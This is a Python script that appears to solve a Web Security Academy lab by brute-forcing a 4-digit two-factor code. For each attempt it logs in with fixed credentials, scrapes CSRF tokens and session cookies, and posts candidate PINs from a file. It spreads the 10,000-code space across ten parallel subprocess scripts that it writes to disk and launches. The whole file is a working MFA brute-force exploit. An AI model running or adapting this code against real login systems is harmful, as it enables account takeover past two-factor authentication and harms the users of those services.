import subprocess
import asyncio

#RUNNING 12 SCRIPTS SEEM TO BE THE MAXIMUM THE SERVER CAN TAKE 

script_to_run_base = """
import aiohttp
import asyncio
from bs4 import BeautifulSoup

#we get login 1 headers to get a session set 
async def macroLogin1(url):
    async with aiohttp.ClientSession(trust_env=True) as session:
        async with session.get(url) as resp:
            sessionTU = resp.cookies['session'].value
            results = await resp.text()
            soupFindL1 = BeautifulSoup(results, 'html.parser')
            csrf_code = soupFindL1.find('input', {'name':'csrf'})['value'] #we get a new csrf token
            return  sessionTU, csrf_code

#We get new session ids from redirect
async def macroLogin1POST(url, ses, csrf):
    async with aiohttp.ClientSession(trust_env=True) as session:
        async with session.post(url = url, cookies= {'session':ses}, data={'csrf':csrf, 'username':'carlos', 'password':'montoya'}, allow_redirects=False) as resp:
            sessionTU = resp.cookies['session'].value
            return  sessionTU



async def macroLogin2GET(url, ses):
    async with aiohttp.ClientSession(trust_env=True) as session:
        async with session.get(url = url, cookies= {'session':ses}) as resp:
            results = await resp.text()
            soupFindL1 = BeautifulSoup(results, 'html.parser')
            csrf_code = soupFindL1.find('input', {'name':'csrf'})['value'] #we get a new csrf token
            return  csrf_code

#We get new session ids from redirect
async def macroLogin2POST(url, ses, csrf, mfa_code):
    async with aiohttp.ClientSession(trust_env=True) as session:
        async with session.post(url = url, cookies= {'session':ses}, data={'csrf':csrf, 'mfa-code':mfa_code}, allow_redirects=False) as resp:
            response_status = resp.status
            if(response_status == 302):
                print(resp.headers)
                sessionTU = resp.cookies['session'].value
                print("Go to /my-account with this session to log in: " , sessionTU)
            return  'csrf_code', response_status



mfa_codes = open('./pins').read().split()


async def test(base_index):
    URLGetLogin1 = 'https://0a8a00ba033160f083b45bf3001300a7.web-security-academy.net/login' 
    tasksLogin1S = [
    macroLogin1(url=URLGetLogin1),
    macroLogin1(url=URLGetLogin1), 
    # macroLogin1(url=URLGetLogin1),
    # macroLogin1(url=URLGetLogin1),macroLogin1(url=URLGetLogin1),
]
    resultsm1 = await asyncio.gather(*tasksLogin1S)
    sessionsCookiesL1 = [{}] * 2
    csrf_codesL1 = [{}] * 2
    #cookie_values = [result.value for result in resultsm1]
    for i in range(len (resultsm1)):
        sessionsCookiesL1[i] = resultsm1[i][0]
        csrf_codesL1[i] = resultsm1[i][1] 

    tasksLogin1P = [macroLogin1POST(url=URLGetLogin1, ses=sessionsCookiesL1[0], csrf=csrf_codesL1[0]),
    macroLogin1POST(url=URLGetLogin1, ses=sessionsCookiesL1[1], csrf=csrf_codesL1[1]),
    ]
    sessionCookieTUinL2 = await asyncio.gather(*tasksLogin1P) #store new sessions from redirect 


    URLGetLogin2 = 'https://0a8a00ba033160f083b45bf3001300a7.web-security-academy.net/login2'

    tasksLogin2GET = [macroLogin2GET(url=URLGetLogin2, ses=sessionCookieTUinL2[0]),
    macroLogin2GET(url=URLGetLogin2,  ses=sessionCookieTUinL2[1]),    
    ]
    csrf_codesToPostInL2 = await asyncio.gather(*tasksLogin2GET) #store new csrf codes from response 


    #now all that's left is to post to L2 with the 4-digit code
    tasksLogin2POST = [macroLogin2POST(url=URLGetLogin2, ses=sessionCookieTUinL2[0], csrf=csrf_codesToPostInL2[0], mfa_code=mfa_codes[base_index]),
    macroLogin2POST(url=URLGetLogin2, ses=sessionCookieTUinL2[1], csrf=csrf_codesToPostInL2[1], mfa_code=mfa_codes[base_index + 1]),
    # macroLogin2POST(url=URLGetLogin2, ses=sessionCookieTUinL2[2], csrf=csrf_codesToPostInL2[2], mfa_code=mfa_codes[base_index + 2]),
    # macroLogin2POST(url=URLGetLogin2, ses=sessionCookieTUinL2[3], csrf=csrf_codesToPostInL2[3], mfa_code=mfa_codes[base_index + 3]),
    # macroLogin2POST(url=URLGetLogin2, ses=sessionCookieTUinL2[4], csrf=csrf_codesToPostInL2[4], mfa_code=mfa_codes[base_index + 4]),   
    ]


    responseF = await asyncio.gather(*tasksLogin2POST)  

    print('Status codes and MFA codes tried are :', responseF[0],responseF[1], mfa_codes[base_index], mfa_codes[base_index+1])

"""

script1 = script_to_run_base + """
async def run_program():
    for i in range(0, 1000, 2):
            try:
                await test(i)  # Await the asynchronous test method
            except:
                print('error at ', i)
loop = asyncio.get_event_loop()
loop.run_until_complete(run_program())
loop.close()
"""

script2 = script_to_run_base + """
async def run_program():
    for i in range(1000, 2000, 2):
            try:
                await test(i)  # Await the asynchronous test method
            except:
                print('error at ', i)

loop = asyncio.get_event_loop()
loop.run_until_complete(run_program())
loop.close()
"""

script3 = script_to_run_base + """
async def run_program():
    for i in range(2000, 3000, 2):
            try:
                await test(i)  # Await the asynchronous test method
            except:
                print('error at ', i)

loop = asyncio.get_event_loop()
loop.run_until_complete(run_program())
loop.close()
"""
script4 = script_to_run_base + """
async def run_program():
    for i in range(3000, 4000, 2):
            try:
                await test(i)  # Await the asynchronous test method
            except:
                print('error at ', i)

loop = asyncio.get_event_loop()
loop.run_until_complete(run_program())
loop.close()
"""
script5 = script_to_run_base + """
async def run_program():
    for i in range(4000, 5000, 2):
            try:
                await test(i)  # Await the asynchronous test method
            except:
                print('error at ', i)

loop = asyncio.get_event_loop()
loop.run_until_complete(run_program())
loop.close()
"""
script6 = script_to_run_base + """
async def run_program():
    for i in range(5000, 6000, 2):
            try:
                await test(i)  # Await the asynchronous test method
            except:
                print('error at ', i)

loop = asyncio.get_event_loop()
loop.run_until_complete(run_program())
loop.close()
"""
script7 = script_to_run_base + """
async def run_program():
    for i in range(6000, 7000, 2):
            try:
                await test(i)  # Await the asynchronous test method
            except:
                print('error at ', i)

loop = asyncio.get_event_loop()
loop.run_until_complete(run_program())
loop.close()
"""

script8 = script_to_run_base + """
async def run_program():
    for i in range(7000, 8000, 2):
            try:
                await test(i)  # Await the asynchronous test method
            except:
                print('error at ', i)

loop = asyncio.get_event_loop()
loop.run_until_complete(run_program())
loop.close()
"""
script9 = script_to_run_base + """
async def run_program():
    for i in range(8000, 9000, 2):
            try:
                await test(i)  # Await the asynchronous test method
            except:
                print('error at ', i)

loop = asyncio.get_event_loop()
loop.run_until_complete(run_program())
loop.close()
"""
script10 = script_to_run_base + """
async def run_program():
    for i in range(9000, 10000, 2):
            try:
                await test(i)  # Await the asynchronous test method
            except:
                print('error at ', i)

loop = asyncio.get_event_loop()
loop.run_until_complete(run_program())
loop.close()
"""


script11 = script_to_run_base + """
async def run_program():
    for i in range(5000, 5500, 2):
            await test(i)  # Await the asynchronous test method

loop = asyncio.get_event_loop()
loop.run_until_complete(run_program())
loop.close()
"""

script12 = script_to_run_base + """
async def run_program():
    for i in range(5500, 6000, 2):
            await test(i)  # Await the asynchronous test method

loop = asyncio.get_event_loop()
loop.run_until_complete(run_program())
loop.close()
"""

script13 = script_to_run_base + """
async def run_program():
    for i in range(6000, 6500, 2):
            await test(i)  # Await the asynchronous test method

loop = asyncio.get_event_loop()
loop.run_until_complete(run_program())
loop.close()
"""
script14 = script_to_run_base + """
async def run_program():
    for i in range(6500, 7000, 2):
            await test(i)  # Await the asynchronous test method

loop = asyncio.get_event_loop()
loop.run_until_complete(run_program())
loop.close()
"""
script15 = script_to_run_base + """
async def run_program():
    for i in range(7000, 7500, 2):
            await test(i)  # Await the asynchronous test method

loop = asyncio.get_event_loop()
loop.run_until_complete(run_program())
loop.close()
"""
script16 = script_to_run_base + """
async def run_program():
    for i in range(7500, 8000, 2):
            await test(i)  # Await the asynchronous test method

loop = asyncio.get_event_loop()
loop.run_until_complete(run_program())
loop.close()
"""
script17 = script_to_run_base + """
async def run_program():
    for i in range(8000, 8500, 2):
            await test(i)  # Await the asynchronous test method

loop = asyncio.get_event_loop()
loop.run_until_complete(run_program())
loop.close()
"""

script18 = script_to_run_base + """
async def run_program():
    for i in range(8500, 9000, 2):
            await test(i)  # Await the asynchronous test method

loop = asyncio.get_event_loop()
loop.run_until_complete(run_program())
loop.close()
"""
script19 = script_to_run_base + """
async def run_program():
    for i in range(9000, 9500, 2):
            await test(i)  # Await the asynchronous test method

loop = asyncio.get_event_loop()
loop.run_until_complete(run_program())
loop.close()
"""
script20 = script_to_run_base + """
async def run_program():
    for i in range(9500, 10000, 2):
            await test(i)  # Await the asynchronous test method

loop = asyncio.get_event_loop()
loop.run_until_complete(run_program())
loop.close()
"""

async def create_and_run_script(script_content, file_num):
    new_script_file_path = './new_script'+str(file_num)+'.py'
    with open(new_script_file_path, "w") as f:
        f.write(script_content)
    await asyncio.create_subprocess_exec("python", new_script_file_path)


async def main():
    script_content_list = [
    script1,
    script2,
    script3,
    script4,
    script5,
    script6,
    script7,
    script8,
    script9,
    script10, 
    # script11, 
    # script12,
    # script13,
    # script14,
    # script15,
    # script16,
    # script17,
    # script18,
    # script19,
    # script20, 
     ]
    tasks = [
    create_and_run_script(script_content_list[0],0), create_and_run_script(script_content_list[1],1),   
    create_and_run_script(script_content_list[2],2), create_and_run_script(script_content_list[3],3),
    create_and_run_script(script_content_list[4],4), create_and_run_script(script_content_list[5],5),
    create_and_run_script(script_content_list[6],6), create_and_run_script(script_content_list[7],7),
    create_and_run_script(script_content_list[8],8), create_and_run_script(script_content_list[9],9),
    # create_and_run_script(script_content_list[10],10), create_and_run_script(script_content_list[11],11),
    # create_and_run_script(script_content_list[12],12), create_and_run_script(script_content_list[13],13),
    # create_and_run_script(script_content_list[14],14), create_and_run_script(script_content_list[15],15),
    # create_and_run_script(script_content_list[16],16), create_and_run_script(script_content_list[17],17),
    # create_and_run_script(script_content_list[18],18), create_and_run_script(script_content_list[19],19),
    ]
    await asyncio.gather(*tasks)
    
asyncio.run(main())
